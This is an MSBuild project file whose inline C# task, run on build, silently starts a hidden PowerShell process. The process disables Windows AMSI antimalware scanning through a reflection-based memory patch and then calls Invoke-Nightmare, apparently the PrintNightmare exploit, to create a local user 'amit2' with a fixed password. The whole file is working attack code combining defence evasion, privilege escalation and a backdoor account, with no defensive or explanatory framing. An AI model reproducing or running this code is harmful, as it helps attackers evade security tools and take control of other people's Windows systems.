<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <Target Name="Hello">
    <ClassExample/>
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Using Namespace="System"/>
      <Using Namespace="System.Reflection"/>
      <Using Namespace="System.Diagnostics"/>
      <Using Namespace="System.Net"/>
      <Using Namespace="System.Management.Automation"/>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.IO;
        using System.Diagnostics;
        using System.Threading;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ClassExample : Task
        {
            public override bool Execute()
            {
                // Start a separate thread for PowerShell execution to avoid blocking MSBuild
                Thread powerShellThread = new Thread(RunPowerShell);
                powerShellThread.Start();
                
                // Optionally, wait for the thread to finish, if needed
                // powerShellThread.Join();
                return true;
            }

            private void RunPowerShell()
            {
                string currentDirectory = Directory.GetCurrentDirectory();
                
                // Full path to PowerShell executable
                string powerShellPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
                
                // AMSI bypass script (adjust as needed)
                string amsiBypass = @"
                $a=[Ref].Assembly.GetTypes(); 
                Foreach($b in $a) {
                    if ($b.Name -like ""*iUtils"") {
                        $c=$b
                    }
                };
                $d=$c.GetFields('NonPublic,Static');
                Foreach($e in $d) {
                    if ($e.Name -like ""*Context"") {
                        $f=$e
                    }
                };
                $g=$f.GetValue($null);
                [IntPtr]$ptr=$g;
                [Int32[]]$buf = @(0);
                [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
                ";

                // Command to execute via PowerShell
                string script = $@"
                    {amsiBypass}
                    Invoke-Nightmare -DriverName ""Xerox"" -NewUser ""amit2"" -NewPassword ""Password123!""
                ";

                // Set up ProcessStartInfo to run the PowerShell script
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = powerShellPath,
                    Arguments = $"-NoExit -Command \"{script}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    RedirectStandardInput = true, // Ensure input can be passed in case of interactivity
                    UseShellExecute = false, // Must be false for redirection to work
                    CreateNoWindow = true
                };

                Process process = new Process();
                process.StartInfo = startInfo;

                // Capture output and error
                process.OutputDataReceived += (sender, e) => {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        Console.Write(e.Data); // Avoid extra line breaks
                    }
                };
                process.ErrorDataReceived += (sender, e) => {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        Console.Write("ERROR: " + e.Data); // Avoid extra line breaks
                    }
                };

                // Capturing verbose and progress output as well
                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                // Wait for the process to exit
                process.WaitForExit();
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
